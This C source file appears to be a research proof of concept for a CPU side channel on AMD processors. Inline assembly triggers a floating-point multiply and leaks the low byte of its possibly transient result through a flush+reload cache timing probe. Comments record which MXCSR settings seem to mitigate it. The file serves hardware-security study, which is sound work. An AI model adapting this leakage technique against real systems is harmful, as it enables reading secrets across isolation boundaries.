#define _GNU_SOURCE
#include <memory.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <sys/prctl.h>
#include <x86intrin.h>
#include <immintrin.h>

#include "cacheutils.h"

//#define ADD_FENCE

#define AMD
#define ITERATIONS 100
#define REPEAT_EXPERIMENT 1000
#define SPACING 4096
#define LEAKAGE_RUNS_PER_TEST_EXEC 1000

unsigned int original_mxcsr_value = -1;

__attribute__((aligned(4096)))
char probe_memory[256 * 4096];

__attribute__((aligned(4096)))
char data_page[256 * 4096];

__attribute__((aligned(4096)))
char data_page_second_mapping[4096];

__attribute__((naked))
void attacker_code(
    char* data_page, 
    char* data_page_second_mapping, 
    char* probe_memory) {
  asm volatile(INTELASM(
        "push   rbx\n\t"
        "push   rbp\n\t"
        "mov    rbp, rsp\n\t"
        "mov    r10, rsi\n\t"
        "mov    r11, rdx\n\t"
        "mov    rsi, rdi\n\t"
        "mov    rdx, rdi\n\t"
        "mov    rcx, rdi\n\t"
        "mov    r8, rdi\n\t"
        "mov    r9, rdi\n\t"
        "mov    rax, rdi\n\t"
        "movq   xmm0, rdi\n\t"
        "movq   xmm1, rdi\n\t"
        "movq   xmm2, rdi\n\t"
        "movq   xmm3, rdi\n\t"
        "movq   xmm4, rdi\n\t"
        "movq   xmm5, rdi\n\t"
        "movq   xmm6, rdi\n\t"
        // non-denormal value
        "movabs r9, 0x81000000001234\n\t"
        "movq   xmm1, r9\n\t"

        // non-denormal value
        "movabs r9, 0x8100000000aaaa\n\t"
        "movq   xmm2, r9\n\t"

        // 
        "clflush BYTE PTR [r10]\n\t"
        "nop\n\t"
        "mulpd  xmm1, xmm2\n\t"
#ifdef ADD_FENCE
        "lfence\n\t"
#endif
        "movq   rax, xmm1\n\t"
        "and    rax, 0xff\n\t"
        "shl    rax, 0xc\n\t"
        "add    r11, rax\n\t"
        "mov    rdx, QWORD PTR [r11]\n\t"
        "mov    rsp, rbp\n\t"
        "pop    rbp\n\t"
        "pop    rbx\n\t"
        "ret\n\t"

  ));
}

void init() {
  // touch memory to make sure its mapped
  memset(probe_memory, 'P', sizeof(probe_memory));
  memset(data_page, 'D', sizeof(data_page));
  memset(data_page_second_mapping, 'D', sizeof(data_page_second_mapping));

  CACHE_MISS = detect_flush_reload_threshold() + 10;
  printf("Cache miss @ %zd\n", CACHE_MISS);
  
  for (size_t i = 0; i < 256; i++) {
    flush(probe_memory + i * SPACING);
  }
  mfence();
}

void execute_leak() {
  int hits[256] = {0};

  for (size_t iter = 0; iter < ITERATIONS; iter++) {

    // make sure it's in the TLB
    maccess(probe_memory + (4096 - 64));
    mfence();

    for (volatile size_t leakage_runs = 0;
        leakage_runs < LEAKAGE_RUNS_PER_TEST_EXEC;
        leakage_runs++) {

      if (!setjmp(trycatch_buf)) {
        attacker_code(
            data_page + 0x80,
            data_page_second_mapping + 0x80,
            probe_memory);
      }
    }

    mfence();
    for (size_t i = 0; i < 256; i++) {
        size_t idx = ((i * 167u) + 13u) & 255u;
        size_t delta = flush_reload_t(probe_memory + idx * SPACING);
        if (delta < CACHE_MISS) {
          hits[idx]++;
        }
    }
  }

  for (size_t i = 0; i < 256; i++) {
    if (hits[i] > 0) {
      printf("Result: 0x%zx (%d times)\n", i, hits[i]);
    }
  } 
}

int main(int argc, char* argv[]) {
  int single_core_mode = 0;
  if (argc == 2 && strcmp(argv[1], "-s") == 0) {
    printf("Starting in single-core mode\n");
    single_core_mode = 1;
  }
  init();

  get_colocated_core_placement();
  // FTZ + DAZ (seems to works as a mitigation)
  //_mm_setcsr( _mm_getcsr() | 0x8040 );
  // DAZ (does not work as mitigation)
  //_mm_setcsr( _mm_getcsr() | 0x40 );

  // ATTACKER THREAD
  if (ATTACKER_CORE == -1) {
    printf("Warn: Attacker core is not set, thus we execute on the victim core.\n");
    ATTACKER_CORE = VICTIM_CORE;
  }
  printf("Attacker Core:\t%d\n", ATTACKER_CORE);
  set_cpu_affinity(ATTACKER_CORE);
  printf("--------------------\n");
  for (size_t experiment_no = 0; experiment_no < REPEAT_EXPERIMENT; experiment_no++) {
    execute_leak();
    printf("--------------------\n");
  }

}



